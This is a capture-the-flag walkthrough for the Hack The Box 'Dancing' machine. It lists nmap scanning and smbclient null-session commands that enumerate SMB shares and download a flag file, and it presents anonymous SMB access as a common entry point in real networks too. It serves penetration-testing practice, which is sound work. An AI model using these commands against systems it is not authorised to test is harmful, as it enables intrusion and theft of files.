# HTB Dancing — Commands Reference

This file contains all commands used to solve the **Dancing** machine on Hack The Box.
Use it as a quick reference while practicing SMB enumeration.

---

# 1. Initial Nmap Scan

Scan the target to discover open ports and services.

```bash
nmap -sC -sV <TARGET-IP>
```

### Explanation

| Option | Meaning                  |
| ------ | ------------------------ |
| `-sC`  | Run default Nmap scripts |
| `-sV`  | Detect service versions  |

---

# 2. Check SMB Shares

List available SMB shares on the target.

```bash
smbclient -L //<TARGET-IP> -N
```

### Explanation

| Option | Meaning                        |
| ------ | ------------------------------ |
| `-L`   | List shares                    |
| `-N`   | Use null session (no password) |

---

# 3. Connect to SMB Share

Connect to the discovered share.

```bash
smbclient //<TARGET-IP>/WorkShares -N
```

If successful you will enter the SMB shell.

```bash
smb: \>
```

---

# 4. List Files in Share

Inside the SMB shell:

```bash
ls
```

---

# 5. Navigate Directories (if needed)

```bash
cd <directory>
```

Example:

```bash
cd Engineering
```

---

# 6. Download Files

Download files from the SMB share.

```bash
get <filename>
```

Example:

```bash
get flag.txt
```

---

# 7. Exit SMB Session

```bash
exit
```

or

```bash
quit
```

---

# 8. Read Downloaded File

After downloading the file locally:

```bash
cat flag.txt
```

---

# Full Attack Command Flow

```bash
nmap -sC -sV <TARGET-IP>

smbclient -L //<TARGET-IP> -N

smbclient //<TARGET-IP>/WorkShares -N

ls

cd Engineering

ls

get flag.txt

exit

cat flag.txt
```

---

# Key Ports Observed

| Port | Service |
| ---- | ------- |
| 135  | MSRPC   |
| 139  | NetBIOS |
| 445  | SMB     |

---

# Key Tools Used

| Tool      | Purpose                         |
| --------- | ------------------------------- |
| nmap      | Network scanning                |
| smbclient | SMB enumeration and file access |

---

# Quick Notes

* Ports **139 and 445** usually indicate **SMB services**
* Always attempt **anonymous login** when enumerating SMB
* Look for **accessible shares** and sensitive files

---

# Tip for OSCP Preparation

When you see:

```
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

Your next step should always be:

```
smbclient -L //<TARGET-IP> -N
```

SMB enumeration is a **very common entry point in penetration testing labs and real environments**.
